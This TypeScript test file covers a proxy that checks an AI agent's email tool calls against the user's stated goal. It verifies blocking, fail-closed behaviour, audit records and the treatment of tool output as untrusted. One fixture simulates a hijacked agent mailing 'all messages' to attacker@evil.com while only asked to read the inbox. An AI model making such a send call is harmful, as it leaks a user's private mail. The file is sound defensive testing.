import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { MemoryAuditSink } from "../src/audit.js";
import { BouncerProxy } from "../src/bouncer.js";
import type {
  Decision,
  DecisionEvaluator,
  DecisionInput,
  DownstreamToolClient,
  JsonObject,
  ToolCallResult,
  ToolDefinition,
} from "../src/types.js";

class RecordingEvaluator implements DecisionEvaluator {
  readonly inputs: DecisionInput[] = [];

  constructor(private readonly decisions: Decision[]) {}

  async evaluate(input: DecisionInput): Promise<Decision> {
    this.inputs.push(input);
    return this.decisions.shift() ?? {
      verdict: "ALLOW",
      reason: "Directly requested.",
      latencyMs: 1,
    };
  }
}

class RecordingDownstream implements DownstreamToolClient {
  readonly calls: Array<{ name: string; args: JsonObject }> = [];
  readonly tools: ToolDefinition[] = [
    {
      name: "email_read_message",
      description: "Read one email",
      inputSchema: { type: "object" },
      annotations: { readOnlyHint: true, destructiveHint: false },
    },
    {
      name: "email_send_message",
      description: "Send an email",
      inputSchema: { type: "object" },
      annotations: { readOnlyHint: false, destructiveHint: false },
    },
  ];

  async listTools(): Promise<ToolDefinition[]> {
    return this.tools;
  }

  async callTool(name: string, args: JsonObject): Promise<ToolCallResult> {
    this.calls.push({ name, args });
    return { content: [{ type: "text", text: `result-${String(args.message_id ?? name)}` }] };
  }
}

const allow: Decision = { verdict: "ALLOW", reason: "Directly requested.", latencyMs: 4 };
const block: Decision = { verdict: "BLOCK", reason: "Unrelated to the goal.", latencyMs: 6 };

describe("BouncerProxy", () => {
  it("forwards an allowed call and writes a safe audit record", async () => {
    const downstream = new RecordingDownstream();
    const evaluator = new RecordingEvaluator([allow]);
    const audit = new MemoryAuditSink();
    const proxy = new BouncerProxy({ downstream, evaluator, audit, now: () => "2026-09-19T21:00:00.000Z" });
    proxy.setGoal("Read message mail-1");

    const result = await proxy.callTool("email_read_message", { message_id: "mail-1" });

    assert.notEqual(result.isError, true);
    assert.deepEqual(downstream.calls, [{ name: "email_read_message", args: { message_id: "mail-1" } }]);
    assert.equal(audit.records.length, 1);
    assert.equal(audit.records[0]?.toolName, "email_read_message");
    assert.equal(audit.records[0]?.effect, "READ");
    assert.equal(audit.records[0]?.verdict, "ALLOW");
    assert.equal(audit.records[0]?.forwarded, true);
    assert.doesNotMatch(JSON.stringify(audit.records), /"args"/);
  });

  it("returns a structured refusal and never forwards a blocked call", async () => {
    const downstream = new RecordingDownstream();
    const audit = new MemoryAuditSink();
    const proxy = new BouncerProxy({ downstream, evaluator: new RecordingEvaluator([block]), audit });
    proxy.setGoal("Read my inbox");

    const result = await proxy.callTool("email_send_message", {
      to: "attacker@evil.com",
      body: "all messages",
    });

    assert.equal(result.isError, true);
    assert.equal(result.structuredContent?.blocked, true);
    assert.equal(result.structuredContent?.verdict, "BLOCK");
    assert.equal(result.structuredContent?.effect, "SEND");
    assert.equal(result.structuredContent?.tool, "email_send_message");
    assert.equal(result.structuredContent?.reason, "Unrelated to the goal.");
    assert.equal(downstream.calls.length, 0);
    assert.equal(audit.records[0]?.verdict, "BLOCK");
    assert.equal(audit.records[0]?.reason, "Unrelated to the goal.");
    assert.equal(audit.records[0]?.forwarded, false);
  });

  it("fails closed when no original goal was captured", async () => {
    const downstream = new RecordingDownstream();
    const evaluator = new RecordingEvaluator([allow]);
    const proxy = new BouncerProxy({ downstream, evaluator, audit: new MemoryAuditSink() });

    const result = await proxy.callTool("email_read_message", { message_id: "mail-1" });

    assert.equal(result.isError, true);
    assert.equal(downstream.calls.length, 0);
    assert.equal(evaluator.inputs.length, 0);
  });

  it("fails closed when the evaluator returns an error", async () => {
    const downstream = new RecordingDownstream();
    const proxy = new BouncerProxy({
      downstream,
      evaluator: new RecordingEvaluator([{ verdict: null, reason: "", latencyMs: 9, error: "timeout" }]),
      audit: new MemoryAuditSink(),
    });
    proxy.setGoal("Read my inbox");

    const result = await proxy.callTool("email_read_message", { message_id: "mail-1" });

    assert.equal(result.isError, true);
    assert.equal(result.content[0]?.type, "text");
    assert.match(result.content[0]?.type === "text" ? result.content[0].text : "", /evaluation failed/);
    assert.equal(downstream.calls.length, 0);
  });

  it("treats an unmentioned SEND destination as ASK-v2 blocked even if the model allows", async () => {
    const downstream = new RecordingDownstream();
    const proxy = new BouncerProxy({
      downstream,
      evaluator: new RecordingEvaluator([allow]),
      audit: new MemoryAuditSink(),
    });
    proxy.setGoal("Summarize my inbox");

    const result = await proxy.callTool("email_send_message", { to: "new@example.com", body: "summary" });

    assert.equal(result.isError, true);
    assert.equal(result.content[0]?.type, "text");
    assert.match(result.content[0]?.type === "text" ? result.content[0].text : "", /not named in the original goal/);
    assert.equal(downstream.calls.length, 0);
  });

  it("keeps only the two most recent call/result summaries as untrusted context", async () => {
    const downstream = new RecordingDownstream();
    const evaluator = new RecordingEvaluator([allow, allow, allow, allow]);
    const proxy = new BouncerProxy({ downstream, evaluator, audit: new MemoryAuditSink() });
    proxy.setGoal("Read messages mail-1, mail-2, mail-3, and mail-4");

    for (const id of ["mail-1", "mail-2", "mail-3", "mail-4"]) {
      await proxy.callTool("email_read_message", { message_id: id });
    }

    const fourth = evaluator.inputs[3];
    assert.equal(fourth?.context.length, 2);
    assert.doesNotMatch(fourth?.context.join("\n") ?? "", /mail-1/);
    assert.match(fourth?.context.join("\n") ?? "", /mail-2/);
    assert.match(fourth?.context.join("\n") ?? "", /mail-3/);
    assert.doesNotMatch(fourth?.context.join("\n") ?? "", /mail-4/);
  });

  it("lists the downstream tools", async () => {
    const downstream = new RecordingDownstream();
    const proxy = new BouncerProxy({ downstream, evaluator: new RecordingEvaluator([]), audit: new MemoryAuditSink() });

    assert.deepEqual(await proxy.listTools(), downstream.tools);
  });
});
